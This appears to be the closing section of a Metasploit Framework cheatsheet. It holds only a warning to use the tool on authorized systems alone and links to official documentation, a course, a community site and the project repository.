**Warning: Security Notice**: Metasploit Framework is a powerful penetration testing tool that should only be used on systems you own or have explicit written authorization to test. Unauthorized use of this tool against systems you do not own is illegal and unethical. Always ensure you have proper authorization before conducting any security testing activities. This cheatsheet is intended for educational purposes and authorized security testing only. Users are responsible for complying with all applicable laws and regulations in their jurisdiction.

**Resources: Additional Resources**:

- [Official Metasploit Documentation](https://docs.rapid7.com/metasploit/)

- [Metasploit Unleashed Course](https://www.offensive-security.com/metasploit-unleashed/)

- [Rapid7 Community](https://community.rapid7.com/)

- [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework)

Source: https://1337skills.com/cheatsheets/metasploit-framework/
